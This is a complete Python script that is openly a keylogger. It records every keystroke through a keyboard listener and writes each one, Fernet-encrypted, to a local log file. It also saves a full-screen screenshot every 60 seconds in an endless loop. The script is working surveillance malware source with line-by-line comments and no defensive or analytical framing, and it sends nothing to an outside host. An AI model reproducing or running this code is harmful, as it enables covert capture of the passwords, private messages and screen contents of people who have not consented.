from cryptography.fernet import Fernet
import os
import time
from pynput import keyboard
from PIL import ImageGrab

# Load or generate encryption key
key_path = os.path.abspath("key.key")  # Define the path for the encryption key file
if not os.path.exists(key_path):  # Check if the key file does not exist
    key = Fernet.generate_key()  # Generate a new encryption key
    with open(key_path, "wb") as key_file:  # Open the key file in write-binary mode
        key_file.write(key)  # Write the generated key to the file
else:
    with open(key_path, "rb") as key_file:  # If the key file exists, open it in read-binary mode
        key = key_file.read()  # Read the key from the file
cipher_suite = Fernet(key)  # Create a Fernet cipher suite using the key

log_file = os.path.abspath("encrypted_key_log.txt")  # Define the path for the encrypted key log file
screenshot_dir = os.path.abspath("screenshots")  # Define the path for the screenshots directory

# Create screenshots directory if it doesn't exist
if not os.path.exists(screenshot_dir):  # Check if the screenshots directory does not exist
    os.makedirs(screenshot_dir)  # Create the screenshots directory

def on_press(key):
    """
    This function is called when a key is pressed.
    It encrypts the key and writes it to the log file.
    """
    try:
        with open(log_file, "ab") as f:  # Open the log file in append-binary mode
            encrypted_data = cipher_suite.encrypt(str(key).encode())  # Encrypt the key and encode it as bytes
            f.write(encrypted_data + b'\n')  # Write the encrypted key followed by a newline to the file
    except Exception as e:  # Catch any exceptions
        print(f"Error writing key log: {e}")  # Print an error message if an exception occurs

def take_screenshot():
    """
    This function takes a screenshot and saves it to the screenshots directory.
    """
    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Get the current timestamp in the format YYYYMMDD-HHMMSS
    screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")  # Define the path for the screenshot file
    ImageGrab.grab().save(screenshot_path, "PNG")  # Take a screenshot and save it as a PNG file

def start_keylogger():
    """
    This function starts the keylogger and screenshot taker.
    """
    listener = keyboard.Listener(on_press=on_press)  # Create a keyboard listener that calls on_press when a key is pressed
    listener.start()  # Start the keyboard listener
    try:
        while True:  # Enter an infinite loop
            take_screenshot()  # Take a screenshot
            time.sleep(60)  # Wait for 60 seconds
    except KeyboardInterrupt:  # Catch the KeyboardInterrupt exception (Ctrl+C)
        listener.stop()  # Stop the keyboard listener

if __name__ == "__main__":
    start_keylogger()  # Start the keylogger if the script is run directly